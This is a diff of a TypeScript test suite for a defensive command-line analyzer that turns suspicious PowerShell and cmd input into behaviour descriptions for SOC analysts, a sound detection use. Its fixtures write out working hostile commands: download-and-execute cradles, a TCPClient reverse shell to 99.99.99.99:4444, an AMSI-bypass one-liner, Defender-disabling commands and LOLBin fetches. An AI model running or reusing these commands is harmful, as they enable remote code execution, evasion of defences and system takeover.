@@ -32,7 +32,7 @@ describe('deriveBullets — decode/decompress family', () => {
   it('a fully-decoded -enc layer fires a resolved decode bullet', () => {
     const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → UTF-16LE', text: "IEX 'hi'", state: 'fully-decoded' }]
     const bullets = deriveBullets(buildContext("IEX 'hi'", [], 'powershell'), layers, [], [])
-    const b = bullets.find((x) => x.text.includes('Base64 `-EncodedCommand`'))
+    const b = bullets.find((x) => x.text.includes('Base64 -EncodedCommand'))
     expect(b).toBeTruthy()
     expect(b!.confidence).toBe('resolved')
   })
@@ -76,7 +76,7 @@ describe('deriveBullets — interpreter-transition family (SOC must-fix #2: neve
   it('an mshta-interpreter signal fires the mshta-execute bullet naming its trigger', () => {
     const signals = [sig('mshta-interpreter', { techniqueIds: ['T1218.005'], trigger: 'https://' })]
     const bullets = deriveBullets(buildContext('', [], 'mshta'), [], [], signals)
-    expect(bullets.some((b) => b.text === 'Executes an mshta payload (`https://`)')).toBe(true)
+    expect(bullets.some((b) => b.text === 'Executes an mshta payload (https://)')).toBe(true)
   })
 
   it('a wsh-script-exec signal fires a language- and host-aware bullet', () => {
@@ -87,28 +87,29 @@ describe('deriveBullets — interpreter-transition family (SOC must-fix #2: neve
 })
 
 describe('deriveBullets — fetch/execute family, resolved vs inferred, method-named (SOC must-fix #4)', () => {
-  it('a resolved download-cradle URL names the download method and the IOC', () => {
-    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'] })]
+  it('a resolved download-cradle URL names the download method (from the Signal.trigger, F2/F3) and the IOC', () => {
+    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'], trigger: '.DownloadString' })]
     const iocs: ExtractedIoc[] = [{ raw: 'http://45.9.148.20/a.ps1', defanged: 'hxxp://45[.]9[.]148[.]20/a[.]ps1', type: 'url', layerIndex: 0 }]
     const ctx = buildContext("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')", [], 'powershell')
     const bullets = deriveBullets(ctx, [], iocs, signals)
     const b = bullets.find((x) => x.verb === 'Downloads')
     expect(b!.confidence).toBe('resolved')
-    expect(b!.text).toBe('Downloads content from **hxxp://45[.]9[.]148[.]20/a[.]ps1** via `WebClient.DownloadString`')
+    expect(b!.text).toBe('Downloads content from hxxp://45[.]9[.]148[.]20/a[.]ps1 via WebClient.DownloadString')
     expect(b!.iocs).toEqual(['http://45.9.148.20/a.ps1'])
     expect(bullets.some((x) => x.text.includes('Executes the downloaded content in memory'))).toBe(true)
   })
 
-  it('names Invoke-WebRequest and Start-BitsTransfer when those are the resolved method', () => {
-    const signals = [sig('download-cradle')]
-    const iwr = deriveBullets(buildContext('Invoke-WebRequest http://x.test/a | IEX', [], 'powershell'), [], [], signals)
-    expect(iwr.find((b) => b.verb === 'Downloads')!.text).toContain('via `Invoke-WebRequest`')
-    const bits = deriveBullets(buildContext('Start-BitsTransfer -Source http://x.test/a ; IEX $x', [], 'powershell'), [], [], signals)
-    expect(bits.find((b) => b.verb === 'Downloads')!.text).toContain('via `Start-BitsTransfer`')
+  it('names Invoke-WebRequest and BITS transfer when those are the resolved method (F2: derived from the Signal.trigger, not an independent re-scan)', () => {
+    const iwrSignal = [sig('download-cradle', { trigger: 'Invoke-WebRequest' })]
+    const iwr = deriveBullets(buildContext('Invoke-WebRequest http://x.test/a | IEX', [], 'powershell'), [], [], iwrSignal)
+    expect(iwr.find((b) => b.verb === 'Downloads')!.text).toContain('via Invoke-WebRequest')
+    const bitsSignal = [sig('download-cradle', { trigger: 'Start-BitsTransfer' })]
+    const bits = deriveBullets(buildContext('Start-BitsTransfer -Source http://x.test/a ; IEX $x', [], 'powershell'), [], [], bitsSignal)
+    expect(bits.find((b) => b.verb === 'Downloads')!.text).toContain('via BITS transfer')
   })
 
   it('an unresolved download-cradle target degrades to inferred, no IOC named', () => {
-    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'] })]
+    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'], trigger: '' })]
     const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], signals)
     const b = bullets.find((x) => x.verb === 'Downloads')
     expect(b!.confidence).toBe('inferred')
@@ -118,17 +119,17 @@ describe('deriveBullets — fetch/execute family, resolved vs inferred, method-n
   it('a cmd-cradle signal fires the fetches-via-for/f bullet', () => {
     const signals = [sig('cmd-cradle', { techniqueIds: ['T1059.003', 'T1105'] })]
     const bullets = deriveBullets(buildContext('', [], 'cmd'), [], [], signals)
-    expect(bullets.some((b) => b.text === 'Fetches a command via `for /f`/finger and executes its output')).toBe(true)
+    expect(bullets.some((b) => b.text === 'Fetches a command via for /f or finger and executes its output')).toBe(true)
   })
 })
 
 describe('deriveBullets — per-LOLBin bullets off the generic lolbin signal (SOC must-fix #1)', () => {
   const LOLBIN_EXPECT: Record<string, string> = {
-    certutil: 'Decodes/downloads a payload via `certutil`',
-    bitsadmin: 'Fetches a file via `bitsadmin`/BITS transfer',
-    regsvr32: 'Registers and executes a remote script via `regsvr32` (Squiblydoo)',
-    rundll32: 'Executes code via `rundll32`',
-    wmic: 'Executes via `wmic`',
+    certutil: 'Decodes/downloads a payload via certutil',
+    bitsadmin: 'Fetches a file via bitsadmin/BITS transfer',
+    regsvr32: 'Registers and executes a remote script via regsvr32 (Squiblydoo)',
+    rundll32: 'Executes code via rundll32',
+    wmic: 'Executes via wmic',
   }
   for (const [bin, text] of Object.entries(LOLBIN_EXPECT)) {
     it(`lolbin trigger "${bin}" fires its dedicated bullet`, () => {
@@ -140,7 +141,7 @@ describe('deriveBullets — per-LOLBin bullets off the generic lolbin signal (SO
   it('msiexec interpolates the resolved MSI URL, or degrades honestly when unresolved', () => {
     const iocs: ExtractedIoc[] = [{ raw: 'http://x.test/a.msi', defanged: 'hxxp://x[.]test/a[.]msi', type: 'url', layerIndex: 0 }]
     const resolved = deriveBullets(buildContext('', [], 'powershell'), [], iocs, [sig('lolbin', { trigger: 'msiexec' })])
-    expect(resolved.some((b) => b.text === 'Installs from a remote MSI via `msiexec /i hxxp://x[.]test/a[.]msi`')).toBe(true)
+    expect(resolved.some((b) => b.text === 'Installs from a remote MSI via msiexec /i hxxp://x[.]test/a[.]msi')).toBe(true)
     const unresolved = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: 'msiexec' })])
     expect(unresolved.some((b) => b.text.includes('URL not resolved'))).toBe(true)
   })
@@ -157,7 +158,7 @@ describe('deriveBullets — evade family: split rules, no slash-hedge (SOC must-
   it('amsi-reflection and amsi-memory-patch are independent rules that can BOTH fire', () => {
     const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('amsi-reflection'), sig('amsi-memory-patch')])
     expect(bullets.some((b) => b.text === 'Disables AMSI (script scanning) via reflection')).toBe(true)
-    expect(bullets.some((b) => b.text === 'Disables AMSI via an in-memory patch (`AmsiScanBuffer`)')).toBe(true)
+    expect(bullets.some((b) => b.text === 'Disables AMSI via an in-memory patch (AmsiScanBuffer)')).toBe(true)
   })
 
   it('etw-tamper fires the ETW-blind bullet', () => {
@@ -171,7 +172,7 @@ describe('deriveBullets — evade family: split rules, no slash-hedge (SOC must-
       [], [], [sig('defender-tamper')],
     )
     expect(both.some((b) => b.text === 'Disables Microsoft Defender real-time monitoring')).toBe(true)
-    expect(both.some((b) => b.text === "Adds a Microsoft Defender exclusion for **C:\\Users\\Public\\x**")).toBe(true)
+    expect(both.some((b) => b.text === "Adds a Microsoft Defender exclusion for C:\\Users\\Public\\x")).toBe(true)
     // never a combined "X / Y" hedge string
     expect(both.some((b) => b.text.includes(' / '))).toBe(false)
   })
@@ -201,19 +202,46 @@ describe('deriveBullets — inject/persist/beacon families', () => {
     expect(wmi.find((b) => b.verb === 'Creates')!.text).toContain('a WMI event subscription')
   })
 
-  it('beaconing names a resolved host and, when the Start-Sleep interval resolves, appends "every ~{n}s"', () => {
-    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
-    const withInterval = deriveBullets(buildContext('while ($true) { Start-Sleep 30; IEX $x }', [], 'powershell'), [], iocs, [sig('beaconing')])
+  it('beaconing names a host resolved from a URL inside its own loop and, when the Start-Sleep interval resolves, appends "every ~{n}s" (F1: never the flat first IOC)', () => {
+    const iocs: ExtractedIoc[] = [{ raw: 'http://45.9.148.20/beacon', defanged: 'hxxp://45[.]9[.]148[.]20/beacon', type: 'url', layerIndex: 0 }]
+    const withInterval = deriveBullets(
+      buildContext("while ($true) { Start-Sleep 30; IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }", [], 'powershell'),
+      [], iocs, [sig('beaconing')],
+    )
     const b = withInterval.find((x) => x.verb === 'Beacons')
     expect(b!.confidence).toBe('resolved')
-    expect(b!.text).toBe('Beacons to **45[.]9[.]148[.]20** in a loop every ~30s')
-    const noInterval = deriveBullets(buildContext('', [], 'powershell'), [], iocs, [sig('beaconing')])
-    expect(noInterval.find((x) => x.verb === 'Beacons')!.text).toBe('Beacons to **45[.]9[.]148[.]20** in a loop')
+    expect(b!.text).toBe('Beacons to hxxp://45[.]9[.]148[.]20/beacon in a loop every ~30s')
+    const noInterval = deriveBullets(
+      buildContext("while ($true) { IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }", [], 'powershell'),
+      [], iocs, [sig('beaconing')],
+    )
+    expect(noInterval.find((x) => x.verb === 'Beacons')!.text).toBe('Beacons to hxxp://45[.]9[.]148[.]20/beacon in a loop')
   })
 
-  it('reverse-shell degrades to inferred with no host IOC', () => {
+  it('beaconing degrades to an unnamed remote host when no URL resolves inside the loop — never names an unrelated IOC sitting elsewhere in the corpus (F1)', () => {
+    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
+    const bullets = deriveBullets(buildContext('while ($true) { Start-Sleep 5; IEX $x }', [], 'powershell'), [], iocs, [sig('beaconing')])
+    const b = bullets.find((x) => x.verb === 'Beacons')
+    expect(b!.confidence).toBe('inferred')
+    expect(b!.text).toBe('Beacons to a remote host in a loop every ~5s')
+  })
+
+  it('reverse-shell degrades to inferred with no parseable TCPClient construct', () => {
     const noHost = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('reverse-shell')])
     expect(noHost.find((b) => b.verb === 'Opens')!.confidence).toBe('inferred')
+    expect(noHost.find((b) => b.verb === 'Opens')!.text).toBe('Opens a reverse shell to a remote endpoint')
+  })
+
+  it('reverse-shell resolves host:port from its own TCPClient construct, ignoring an unrelated IOC elsewhere in the corpus (F1)', () => {
+    const iocs: ExtractedIoc[] = [{ raw: '11.11.11.11', defanged: '11[.]11[.]11[.]11', type: 'ipv4', layerIndex: 0 }]
+    const bullets = deriveBullets(
+      buildContext("(New-Object Net.Sockets.TCPClient('99.99.99.99',4444))", [], 'powershell'),
+      [], iocs, [sig('reverse-shell')],
+    )
+    const b = bullets.find((x) => x.verb === 'Opens')
+    expect(b!.confidence).toBe('resolved')
+    expect(b!.text).toBe('Opens a reverse shell to 99[.]99[.]99[.]99:4444')
+    expect(b!.text).not.toContain('11.11.11.11')
   })
 })
 
@@ -236,7 +264,7 @@ describe('execution ordering (D2/D6, 11-tier): delivery → interpreter-transiti
     // decode(4) < evade(6) < fetch(7) < execute(8).
     const r = await analyze('powershell -nop -w hidden -enc ' + ENC_CRADLE)
     const texts = r.bullets.map((b) => b.text)
-    const decodeIdx = texts.findIndex((t) => t.includes('Base64 `-EncodedCommand`'))
+    const decodeIdx = texts.findIndex((t) => t.includes('Base64 -EncodedCommand'))
     const evadeIdx = texts.findIndex((t) => t.startsWith('Runs hidden'))
     const fetchIdx = texts.findIndex((t) => t.includes('Downloads content from'))
     const execIdx = texts.findIndex((t) => t.includes('Executes the downloaded content in memory'))
@@ -258,8 +286,8 @@ describe('banned-word discipline (D6, mirrors doctrine.ts, widened word list)', 
   const BANNED = /\b(malicious|attacker|likely|c2|backdoor|exploit|compromise|adversary|threat actor|hack)\b/i
 
   it('"payload" and "beacon" are allowed terms of art (used in spec §7\'s own example bullets), not banned', () => {
-    expect('Executes an mshta payload (`https://`)').not.toMatch(BANNED)
-    expect('Beacons to **45[.]9[.]148[.]20** in a loop').not.toMatch(BANNED)
+    expect('Executes an mshta payload (https://)').not.toMatch(BANNED)
+    expect('Beacons to 45[.]9[.]148[.]20 in a loop').not.toMatch(BANNED)
   })
 
   it('no bullet emits a banned word across a representative fixture sweep', async () => {
@@ -326,7 +354,88 @@ describe('end-to-end fixture: finger/for-f cradle (D6)', () => {
   it('yields a single resolved fetch bullet naming the for-f/finger cradle', async () => {
     const r = await analyze("cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
     expect(r.bullets).toHaveLength(1)
-    expect(r.bullets[0].text).toBe('Fetches a command via `for /f`/finger and executes its output')
+    expect(r.bullets[0].text).toBe('Fetches a command via for /f or finger and executes its output')
     expect(r.bullets[0].confidence).toBe('resolved')
+  })
+})
+
+// ---- Whole-branch review regression fixtures (2026-08-19) ----
+// All four findings below only surface on composed multi-fact real input
+// (through analyze() end to end) — which is exactly why the per-task reviews
+// missed them; each isolated ActionRule looked correct on its own.
+describe('whole-branch review regressions (2026-08-19)', () => {
+  it('F1 CRITICAL: per-behavior host attribution — a two-host sample never lets one behavior name another behavior\'s host', async () => {
+    // A download cradle pulling from 11.11.11.11, and a SEPARATE reverse shell
+    // (with the GetStream()/Read() discriminator techniques.ts's reverse-shell
+    // rule requires) connecting to 99.99.99.99:4444. Before the fix, every
+    // host-naming bullet used the first host IOC in the whole flat list —
+    // the reverse-shell bullet named 11.11.11.11 (the download URL) and never
+    // mentioned 99.99.99.99, and the port was dropped entirely.
+    const input =
+      "IEX (New-Object Net.WebClient).DownloadString('http://11.11.11.11/stage2.ps1'); " +
+      "$client = New-Object Net.Sockets.TCPClient('99.99.99.99',4444); $stream = $client.GetStream(); " +
+      '[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){' +
+      '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); IEX $data}'
+    const r = await analyze(input)
+
+    const download = r.bullets.find((b) => b.verb === 'Downloads')
+    const reverseShell = r.bullets.find((b) => b.verb === 'Opens')
+    expect(download).toBeTruthy()
+    expect(reverseShell).toBeTruthy()
+
+    expect(download!.text).toContain('11[.]11[.]11[.]11')
+    // the download bullet must never pick up the reverse-shell's host either
+    expect(download!.text).not.toContain('99.99.99.99')
+
+    // the reverse-shell bullet must name ITS OWN host:port — 99.99.99.99:4444 —
+    // and must NEVER contain 11.11.11.11 (the download URL's host)
+    expect(reverseShell!.text).toBe('Opens a reverse shell to 99[.]99[.]99[.]99:4444')
+    expect(reverseShell!.text).not.toContain('11.11.11.11')
+    expect(reverseShell!.iocs).toEqual(['99.99.99.99'])
+  })
+
+  it('F2 MAJOR: download method is derived from the download-cradle Signal.trigger, not an independent corpus re-scan (a commented-out Start-BitsTransfer must not out-rank the real DownloadString construct)', async () => {
+    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a'); # Start-BitsTransfer -Source http://x.test/a")
+    const b = r.bullets.find((x) => x.verb === 'Downloads')
+    expect(b).toBeTruthy()
+    expect(b!.text).toContain('WebClient.DownloadString')
+    expect(b!.text).not.toContain('BITS transfer')
+  })
+
+  it('F3 MAJOR: a resolved-URL construct with a position-0 irm/iwr trigger resolves the method and is NEVER rendered as "assembled at runtime"', async () => {
+    const r = await analyze('irm http://45.9.148.20/a.ps1 | iex')
+    const b = r.bullets.find((x) => x.verb === 'Downloads')
+    expect(b).toBeTruthy()
+    expect(b!.confidence).toBe('resolved')
+    expect(b!.iocs).toContain('http://45.9.148.20/a.ps1')
+    expect(b!.text).toContain('hxxp://45[.]9[.]148[.]20/a[.]ps1')
+    expect(b!.text).not.toContain('assembled at runtime')
+  })
+
+  it('F4 MAJOR: no bullet renders literal Markdown (** or a backtick) across a representative fixture sweep — ActionBullets.tsx renders {b.text} as plain text, not through a markdown parser', async () => {
+    const fixtures = [
+      'powershell -nop -w hidden -enc ' + ENC_CRADLE,
+      "IEX (New-Object Net.WebClient).DownloadString('http://11.11.11.11/stage2.ps1'); " +
+        "$client = New-Object Net.Sockets.TCPClient('99.99.99.99',4444); $stream = $client.GetStream(); " +
+        '[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){' +
+        '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); IEX $data}',
+      "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')",
+      "cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue",
+      "while ($true) { Start-Sleep 5; IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }",
+      'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
+      'Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute powershell)',
+      "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\x'",
+      'certutil -urlcache -f http://45.9.148.20/a.exe a.exe',
+      'wscript //E:vbscript C:\\Users\\Public\\payload.vbs',
+      "msiexec /i http://45.9.148.20/a.msi",
+      'irm http://45.9.148.20/a.ps1 | iex',
+    ]
+    for (const input of fixtures) {
+      const r = await analyze(input)
+      for (const b of r.bullets) {
+        expect(b.text).not.toContain('**')
+        expect(b.text).not.toContain('`')
+      }
+    }
   })
 })
